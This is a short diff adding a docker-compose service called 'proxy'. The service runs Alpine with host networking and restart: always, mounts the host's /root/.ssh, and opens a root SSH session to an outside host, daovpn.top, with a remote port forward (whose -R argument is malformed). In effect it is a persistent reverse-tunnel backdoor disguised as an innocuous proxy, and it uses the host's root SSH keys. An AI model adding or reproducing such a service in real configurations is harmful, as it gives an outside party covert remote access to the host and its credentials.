@@ -1,0 +1,9 @@
+proxy:
+   image: alpine
+   restart: always
+   net: host
+   command: sh -c 'apk add openssh; ssh -t root@daovpn.top -R 22:2222'
+   ports:
+     - 80:80
+   volumes:
+     -  /root/.ssh:/root/.ssh
